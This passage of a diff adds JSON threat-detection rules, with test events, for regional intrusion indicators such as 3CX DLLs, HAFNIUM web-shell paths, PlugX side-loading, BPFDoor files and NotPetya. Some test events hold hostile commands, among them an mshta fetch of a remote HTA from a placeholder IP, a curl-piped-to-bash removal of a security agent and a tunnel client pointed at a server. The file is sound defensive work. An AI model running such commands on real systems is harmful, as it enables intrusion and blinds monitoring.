+       "operation": "set"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-kr-3cx-trojanized-module",
+   "name": "Unsigned ffmpeg.dll or d3dcompiler_47.dll in 3CXDesktopApp",
+   "description": "The 2023 3CX supply-chain compromise (attributed to DPRK actors) shipped trojanized ffmpeg.dll and d3dcompiler_47.dll inside the 3CXDesktopApp directory.",
+   "tactic": "Initial Access",
+   "technique": "T1195.002",
+   "technique_name": "Compromise Software Supply Chain",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "module",
+   "match": {
+    "all": [
+     {
+      "field": "module_path",
+      "op": "contains",
+      "pattern": "\\3cxdesktopapp\\app\\"
+     },
+     {
+      "field": "module_path",
+      "op": "suffix",
+      "patterns": [
+       "\\ffmpeg.dll",
+       "\\d3dcompiler_47.dll"
+      ]
+     },
+     {
+      "field": "signed",
+      "op": "equals",
+      "pattern": "false"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "kr",
+    "lazarus",
+    "supply-chain",
+    "3cx"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "module_path": "C:\\Users\\ann\\AppData\\Local\\Programs\\3CXDesktopApp\\app\\ffmpeg.dll",
+       "signed": "false",
+       "hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "module_path": "C:\\Users\\ann\\AppData\\Local\\Programs\\3CXDesktopApp\\app\\ffmpeg.dll",
+       "signed": "true",
+       "hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-jp-windows-sandbox-wsb",
+   "name": "Windows Sandbox launched with a user-supplied .wsb file",
+   "description": "WindowsSandbox.exe started on a .wsb configuration from a user-writable path. JPCERT/CC and others documented MirrorFace running malware inside Windows Sandbox to evade host AV.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.006",
+   "technique_name": "Run Virtual Instance",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\windowssandbox.exe",
+       "\\windowssandboxclient.exe"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": ".wsb"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\",
+       "\\appdata\\",
+       "\\temp\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "jp",
+    "mirrorface",
+    "sandbox"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsSandbox.exe",
+      "command": "WindowsSandbox.exe C:\\Users\\ann\\AppData\\Local\\Temp\\a.wsb"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsSandbox.exe",
+      "command": "WindowsSandbox.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-jp-ichitaro-spawns-shell",
+   "name": "Ichitaro word processor spawning a shell or script host",
+   "description": "JustSystems Ichitaro is a Japan-specific document target; a shell or script host child is a classic exploit tail. Vendor binary names are from public reporting and not verified here.",
+   "tactic": "Execution",
+   "technique": "T1203",
+   "technique_name": "Exploitation for Client Execution",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "\\\\(taro\\d*|jxw|ichitaro\\w*)\\.exe$"
+     },
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\cmd.exe",
+       "\\powershell.exe",
+       "\\pwsh.exe",
+       "\\wscript.exe",
+       "\\cscript.exe",
+       "\\mshta.exe",
+       "\\rundll32.exe",
+       "\\regsvr32.exe"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "jp",
+    "office",
+    "exploit"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c whoami",
+      "parent_exe": "C:\\Program Files\\JustSystems\\JXW\\TARO.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c whoami",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-wps-spawns-shell",
+   "name": "WPS Office spawning a shell or script host",
+   "description": "Kingsoft WPS Writer/Spreadsheets/Presentation starting a shell, script host or LOLBin. WPS exploits have been used against Chinese-speaking and East Asian targets.",
+   "tactic": "Execution",
+   "technique": "T1203",
+   "technique_name": "Exploitation for Client Execution",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "suffix",
+      "patterns": [
+       "\\wps.exe",
+       "\\et.exe",
+       "\\wpp.exe"
+      ]
+     },
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\cmd.exe",
+       "\\powershell.exe",
+       "\\pwsh.exe",
+       "\\wscript.exe",
+       "\\cscript.exe",
+       "\\mshta.exe",
+       "\\rundll32.exe",
+       "\\regsvr32.exe"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "office",
+    "exploit"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\mshta.exe",
+      "command": "mshta http://203.0.113.9/a.hta",
+      "parent_exe": "C:\\Users\\ann\\AppData\\Local\\Kingsoft\\WPS Office\\12\\office6\\wps.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c dir",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-sunlogin-child-shell",
+   "name": "Sunlogin client spawning a shell (RCE tail)",
+   "description": "SunloginClient.exe with a shell or PowerShell child matches exploitation of the widely abused Sunlogin remote-control RCE flaws.",
+   "tactic": "Initial Access",
+   "technique": "T1190",
+   "technique_name": "Exploit Public-Facing Application",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "suffix",
+      "pattern": "\\sunloginclient.exe"
+     },
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\cmd.exe",
+       "\\powershell.exe"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "sunlogin",
+    "rce"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c whoami",
+      "parent_exe": "C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\SunloginClient.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c whoami",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-frp-client",
+   "name": "frp reverse-proxy client with a config file",
+   "description": "frpc/frps started with an ini or toml config, a Go reverse proxy used by many China-nexus groups. Also used by self-hosters, hence medium.",
+   "tactic": "Command and Control",
+   "technique": "T1090",
+   "technique_name": "Proxy",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\frpc.exe",
+       "\\frps.exe",
+       "/frpc",
+       "/frps"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s(-c|--config)\\s+\\S*\\.(ini|toml|yaml|json)"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "tunnel",
+    "frp"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\Public\\frpc.exe",
+      "command": "frpc.exe -c frpc.ini"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Users\\Public\\frpc.exe",
+      "command": "frpc.exe --version"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-nps-client",
+   "name": "nps/npc tunnel client with server and verify key",
+   "description": "npc started with -server= and -vkey=, the nps intranet-penetration client frequently seen in Chinese-language intrusion toolkits.",
+   "tactic": "Command and Control",
+   "technique": "T1090",
+   "technique_name": "Proxy",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\npc.exe",
+       "/npc"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "-server="
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "-vkey="
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "tunnel",
+    "nps"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\ProgramData\\npc.exe",
+      "command": "npc.exe -server=203.0.113.2:8024 -vkey=abcd1234 -type=tcp"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\ProgramData\\npc.exe",
+      "command": "npc.exe -h"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-fscan-sweep",
+   "name": "fscan internal scanner invocation",
+   "description": "fscan, a Go all-in-one intranet scanner popular in Chinese-language red-team and intrusion toolkits, run with -h against an address range.",
+   "tactic": "Discovery",
+   "technique": "T1046",
+   "technique_name": "Network Service Discovery",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])fscan[\\w.-]*(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-h\\s+\\d{1,3}(\\.\\d{1,3}){2,3}"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "scanner"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\Public\\fscan.exe",
+      "command": "fscan.exe -h 10.0.0.0/24 -np"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Users\\Public\\fscan.exe",
+      "command": "fscan.exe -help"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-exchange-owa-auth-aspx",
+   "name": "ASPX written into Exchange OWA auth directory",
+   "description": "A .aspx created under FrontEnd\\HttpProxy\\owa\\auth is the HAFNIUM/ProxyLogon web shell drop location documented by Microsoft and national CERTs.",
+   "tactic": "Persistence",
+   "technique": "T1505.003",
+   "technique_name": "Web Shell",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "contains",
+      "pattern": "\\frontend\\httpproxy\\owa\\auth\\"
+     },
+     {
+      "field": "path",
+      "op": "suffix",
+      "pattern": ".aspx"
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "hafnium",
+    "exchange",
+    "webshell"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\x.aspx",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\logon.aspx",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-exchange-aspnet-client-aspx",
+   "name": "ASPX created in IIS aspnet_client",
+   "description": "Web shells dropped in inetpub\\wwwroot\\aspnet_client were a frequent HAFNIUM placement. Patching tools can touch the folder, so medium.",
+   "tactic": "Persistence",
+   "technique": "T1505.003",
+   "technique_name": "Web Shell",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "contains",
+      "pattern": "\\inetpub\\wwwroot\\aspnet_client\\"
+     },
+     {
+      "field": "path",
+      "op": "suffix",
+      "pattern": ".aspx"
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "hafnium",
+    "exchange",
+    "webshell"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\shell.aspx",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\readme.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-java-webshell-recon",
+   "name": "Java application server child running recon commands",
+   "description": "java/tomcat spawning cmd or PowerShell with whoami, ipconfig or net user, the visible tail of JSP web shells (AntSword, Behinder, Godzilla) common in Chinese-language intrusions.",
+   "tactic": "Execution",
+   "technique": "T1505.003",
+   "technique_name": "Web Shell",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "\\\\(java|javaw|tomcat\\d*|tomcat\\d*w)\\.exe$"
+     },
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\cmd.exe",
+       "\\powershell.exe"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(whoami|ipconfig|net user|systeminfo|tasklist|netstat)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "webshell"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c whoami",
+      "parent_exe": "C:\\Program Files\\Apache\\Tomcat9\\bin\\tomcat9.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c build.bat",
+      "parent_exe": "C:\\Program Files\\Apache\\Tomcat9\\bin\\tomcat9.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-linux-webserver-recon-child",
+   "name": "Linux web server worker running recon shell commands",
+   "description": "php-fpm, httpd, nginx or apache2 parent running a shell with whoami, id, uname -a or reading /etc/passwd, the tail of PHP web shells (China Chopper, Behinder, Godzilla).",
+   "tactic": "Execution",
+   "technique": "T1505.003",
+   "technique_name": "Web Shell",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "/(php-fpm\\d*(\\.\\d+)?|php-cgi|httpd|nginx|apache2)$"
+     },
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "/sh",
+       "/bash",
+       "/dash"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(whoami|\\bid\\b|uname -a|/etc/passwd)"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "webshell",
+    "linux"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c whoami",
+      "parent_exe": "/usr/sbin/php-fpm8.1"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c ./deploy.sh",
+      "parent_exe": "/usr/sbin/php-fpm8.1"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-plugx-sxs-programdata",
+   "name": "Executable launched from ProgramData\\SxS (PlugX staging)",
+   "description": "Binaries run from C:\\ProgramData\\SxS have been seen as PlugX side-loading staging. Heuristic from public write-ups; treat as an audit lead.",
+   "tactic": "Defense Evasion",
+   "technique": "T1574.002",
+   "technique_name": "T1574.002",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "contains",
+      "pattern": "\\programdata\\sxs\\"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "plugx",
+    "noisy-risk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\ProgramData\\SxS\\hpcustpartui.exe",
+      "command": "hpcustpartui.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\WinSxS\\amd64_x\\app.exe",
+      "command": "app.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-wsc-dll-sideload",
+   "name": "Unsigned wsc.dll loaded outside Avast directories",
+   "description": "wsc.dll beside a renamed Avast wsc_proxy.exe is a repeatedly documented side-loading pair for Mustang Panda PlugX loaders.",
+   "tactic": "Defense Evasion",
+   "technique": "T1574.002",
+   "technique_name": "T1574.002",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "module",
+   "match": {
+    "all": [
+     {
+      "field": "module_path",
+      "op": "suffix",
+      "pattern": "\\wsc.dll"
+     },
+     {
+      "field": "signed",
+      "op": "equals",
+      "pattern": "false"
+     },
+     {
+      "not": {
+       "field": "module_path",
+       "op": "contains",
+       "pattern": "\\program files"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "mustang-panda",
+    "sideload"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "module_path": "C:\\Users\\Public\\wsc.dll",
+       "signed": "false",
+       "hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "module_path": "C:\\Program Files\\AVAST Software\\Avast\\wsc.dll",
+       "signed": "false",
+       "hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-libvlc-dll-sideload",
+   "name": "Unsigned libvlc.dll loaded outside VideoLAN directories",
+   "description": "A fake libvlc.dll next to a copied VLC binary is a recurring side-loading carrier for China-nexus loaders.",
+   "tactic": "Defense Evasion",
+   "technique": "T1574.002",
+   "technique_name": "T1574.002",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "module",
+   "match": {
+    "all": [
+     {
+      "field": "module_path",
+      "op": "suffix",
+      "pattern": "\\libvlc.dll"
+     },
+     {
+      "field": "signed",
+      "op": "equals",
+      "pattern": "false"
+     },
+     {
+      "not": {
+       "field": "module_path",
+       "op": "contains",
+       "patterns": [
+        "\\videolan\\",
+        "\\program files"
+       ]
+      }
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "sideload"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "module_path": "C:\\ProgramData\\vlc\\libvlc.dll",
+       "signed": "false",
+       "hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "module_path": "C:\\Program Files\\VideoLAN\\VLC\\libvlc.dll",
+       "signed": "true",
+       "hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-ccleaner-agomo-registry",
+   "name": "Piriform Agomo registry values (CCleaner 5.33 backdoor)",
+   "description": "The 2017 CCleaner supply-chain compromise (APT17/Winnti-linked) wrote victim identifiers under HKLM\\SOFTWARE\\Piriform\\Agomo (MUID, TID, NID). Historic but still a useful retro-hunt signal.",
+   "tactic": "Defense Evasion",
+   "technique": "T1195.002",
+   "technique_name": "Compromise Software Supply Chain",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "registry",
+   "match": {
+    "all": [
+     {
+      "field": "key",
+      "op": "contains",
+      "pattern": "\\software\\piriform\\agomo"
+     },
+     {
+      "field": "value_name",
+      "op": "in",
+      "patterns": [
+       "muid",
+       "tid",
+       "nid"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "supply-chain",
+    "ccleaner",
+    "noisy-risk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "key": "HKLM\\SOFTWARE\\Piriform\\Agomo",
+       "value_name": "MUID",
+       "value_data": "0x1234",
+       "operation": "set"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "key": "HKLM\\SOFTWARE\\Piriform\\CCleaner",
+       "value_name": "Language",
+       "value_data": "1033",
+       "operation": "set"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-aliyun-agent-removal",
+   "name": "Alibaba Cloud agent uninstall or kill on Linux",
+   "description": "Cryptominer and botnet operators (Rocke, TeamTNT lineage, many Chinese-language clusters) remove Alibaba Cloud security agents (aegis/aliyun) before deploying payloads.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "T1562.001",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(aegis[_/]?\\w*/(uninstall|quartz_uninstall)\\.sh|update\\.aegis\\.aliyun\\.com|aliyun-service\\b.*(stop|disable|rm )|(kill|pkill).*(aegis|aliyun))"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "miner",
+    "linux",
+    "cloud-agent"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'curl -s http://update.aegis.aliyun.com/download/uninstall.sh | bash'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'systemctl status aliyun.service'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-tencent-agent-removal",
+   "name": "Tencent Cloud agent uninstall on Linux",
+   "description": "Removal of the Tencent Cloud monitoring stack (qcloud stargate/YunJing/BaradAgent), a defence-evasion step in Chinese-language cryptojacking tooling.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "T1562.001",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/usr/local/(qcloud|sa)/(stargate|YunJing|monitor)[^ ]*/(uninstall|uninst)\\.sh|/usr/local/qcloud/.*(uninstall|uninst)"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "miner",
+    "linux",
+    "cloud-agent"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash /usr/local/qcloud/YunJing/uninst.sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash /usr/local/qcloud/YunJing/status.sh"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-coathanger-bdkey",
+   "name": "COATHANGER FortiGate implant paths",
+   "description": "Files under a .bd.key directory (preload.so) are the persistence artefacts of COATHANGER, reported by Dutch MIVD/NCSC-NL against FortiGate devices.",
+   "tactic": "Persistence",
+   "technique": "T1554",
+   "technique_name": "Compromise Host Software Binary",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "contains",
+      "pattern": "/.bd.key/"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "coathanger",
+    "edge-device",
+    "linux"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/data2/.bd.key/preload.so",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/data2/config/preload.conf",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-pygmygoat-libsophos",
+   "name": "Pygmy Goat libsophos.so on a Sophos firewall",
+   "description": "NCSC UK published a malware analysis report on Pygmy Goat, a Linux SSH-style backdoor named libsophos.so deployed on Sophos XG firewalls.",
+   "tactic": "Persistence",
+   "technique": "T1574.006",
+   "technique_name": "Dynamic Linker Hijacking",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "pattern": "/libsophos.so"
+     },
+     {
+      "not": {
+       "field": "path",
+       "op": "contains",
+       "patterns": [
+        "/opt/sophos/",
+        "/usr/lib/sophos"
+       ]
+      }
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "pygmygoat",
+    "edge-device",
+    "linux"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/lib/libsophos.so",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/opt/sophos/lib/libsophos.so",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-bpfdoor-shm",
+   "name": "BPFDoor staging file in /dev/shm",
+   "description": "BPFDoor (Red Menshen, targeting telecoms in Asia and the Middle East) runs from /dev/shm/kdmtmpflush.",
+   "tactic": "Defense Evasion",
+   "technique": "T1205.002",
+   "technique_name": "Socket Filters",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "equals",
+      "pattern": "/dev/shm/kdmtmpflush"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "bpfdoor",
+    "telecom",
+    "linux"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/dev/shm/kdmtmpflush",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/dev/shm/pulse-shm-1",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-bpfdoor-pidfiles",
+   "name": "BPFDoor lock and pid files",
+   "description": "BPFDoor variants create /var/run/haldrund.pid or /var/run/kdevrund.pid (and an initd.lock) as run markers.",
+   "tactic": "Defense Evasion",
+   "technique": "T1205.002",
+   "technique_name": "Socket Filters",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "in",
+      "patterns": [
+       "/var/run/haldrund.pid",
+       "/var/run/kdevrund.pid",
+       "/var/run/initd.lock"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "bpfdoor",
+    "telecom",
+    "linux"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/var/run/haldrund.pid",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/var/run/sshd.pid",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-gotohttp",
+   "name": "GotoHTTP remote-access tool executed",
+   "description": "GotoHTTP is a Chinese-origin web remote-control tool; its use on servers has been reported in Chinese-language intrusions. Legitimate use exists.",
+   "tactic": "Command and Control",
+   "technique": "T1219",
+   "technique_name": "Remote Access Tools",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\gotohttp.exe",
+       "\\gotohttp_win.exe"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "rmm",
+    "noisy-risk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\ann\\Downloads\\GotoHTTP.exe",
+      "command": "GotoHTTP.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\notepad.exe",
+      "command": "notepad.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-notpetya-perfc-rundll32",
+   "name": "rundll32 loading perfc.dat (NotPetya)",
+   "description": "NotPetya launches its payload with rundll32 C:\\Windows\\perfc.dat,#1. The file name is a stable public indicator of the 2017 Ukraine-origin wiper.",
+   "tactic": "Execution",
+   "technique": "T1218.011",
+   "technique_name": "Rundll32",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\rundll32.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "perfc.dat"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "ua",
+    "notpetya",
+    "wiper"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\rundll32.exe",
+      "command": "rundll32.exe C:\\Windows\\perfc.dat,#1 30"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\rundll32.exe",
+      "command": "rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-notpetya-perfc-file",
+   "name": "perfc.dat written to the Windows directory",
+   "description": "NotPetya drops its DLL as C:\\Windows\\perfc.dat.",
+   "tactic": "Impact",
+   "technique": "T1561.002",
